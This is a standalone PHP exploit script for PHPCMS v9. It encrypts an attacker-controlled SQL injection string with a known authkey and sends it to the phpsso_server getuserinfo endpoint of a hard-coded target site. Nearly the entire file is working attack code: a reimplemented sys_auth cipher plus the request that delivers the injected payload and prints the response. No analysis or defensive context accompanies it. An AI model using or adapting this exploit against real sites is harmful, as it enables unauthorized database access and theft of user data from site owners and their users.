<?php
/**
 * Created by 独自等待
 * Date: 2015/7/17
 * Time: 21:08
 * Name: phpcmsv9_authkey_sql.php
 * 独自等待博客：http://www.waitalone.cn/
 */
set_time_limit(0);
$wang_url = 'http://www.2l.cn';       //请修改这里为phpcmsv9网站地址
$auth_key = 'H9zUDnCVcNUvuk9EHIANYHfRvC2W5kAF'; //这里为phpcmsv9 authkey
$str = "uid=1" . stripslashes($_GET['id']);
$encode = sys_auth($str, 'ENCODE', $auth_key);
$content = file_get_contents($wang_url . "/phpsso_server/?m=phpsso&c=index&a=getuserinfo&appid=1&data=" . $encode);
echo $content;
function sys_auth($string, $operation = 'ENCODE', $key = '', $expiry = 0)
{
    $key_length = 4;
    $key = md5($key);
    $fixedkey = hash('md5', $key);
    $egiskeys = md5(substr($fixedkey, 16, 16));
    $runtokey = $key_length ? ($operation == 'ENCODE' ? substr(hash('md5', microtime(true)), -$key_length) : substr($string, 0, $key_length)) : '';
    $keys = hash('md5', substr($runtokey, 0, 16) . substr($fixedkey, 0, 16) . substr($runtokey, 16) . substr($fixedkey, 16));
    $string = $operation == 'ENCODE' ? sprintf('%010d', $expiry ? $expiry + time() : 0) . substr(md5($string . $egiskeys), 0, 16) . $string : base64_decode(substr($string, $key_length));
    $i = 0;
    $result = '';
    $string_length = strlen($string);
    for ($i = 0; $i < $string_length; $i++) {
        $result .= chr(ord($string{$i}) ^ ord($keys{$i % 32}));
    }
    if ($operation == 'ENCODE') {
        return $runtokey . str_replace('=', '', base64_encode($result));
    } else {
        if ((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() > 0) && substr($result, 10, 16) == substr(md5(substr($result, 26) . $egiskeys), 0, 16)) {
            return substr($result, 26);
        } else {
            return '';
        }
    }
}
?>
